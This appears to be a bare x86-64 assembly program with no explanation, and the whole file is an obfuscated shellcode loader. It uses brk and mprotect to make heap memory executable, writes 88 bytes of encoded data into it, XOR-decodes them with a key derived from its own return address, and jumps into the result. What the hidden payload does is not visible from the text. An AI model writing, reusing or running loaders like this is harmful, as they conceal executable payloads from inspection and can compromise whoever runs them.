	
	.section .text
	.globl _start

f:
	popq	%rax
	pushq	%rax
	shrl	$0x10,%eax
	xorb	$0x2e,%al
	movzxb	%al,%eax
	ret

_start:

	call	f
	pushq	%rax
	xorl	%edi,%edi
	pushq	$0xc
	popq	%rax
	syscall
	pushq	%rax
	addb	$0x58,%al
	movq	%rax,%rdi
	pushq	$0xc
	popq	%rax
	syscall
	pushq	$0xa
	popq	%rax
	popq	%rdi
	pushq	%rdi
	pushq	$0x58
	popq	%rsi
	pushq	$7
	popq	%rdx
	syscall
	xorl	%ecx,%ecx
	popq	%rdi
	movq	$0x6f04316c04364704,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x5fabe76b61bc5f30,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x807149193d63eae,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0xe73644043e919eed,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x61347e0488e72681,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0xe7364f04356c046b,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x17a5916b61b0e781,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0xc41d4263eae5f9d,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x263c061d41410007,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x26398ce7263e89e7,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	movq	$0x6b61fe36550488e7,%rax
	movq	%rax,0x0(%rdi,%rcx,8)
	incl	%ecx
	shll	$3,%ecx
	decl	%ecx
	popq	%rax
.L1:
	xorb	%al,0x0(%rdi,%rcx,1)
	decl	%ecx
	jns	.L1
	jmp	*%rdi
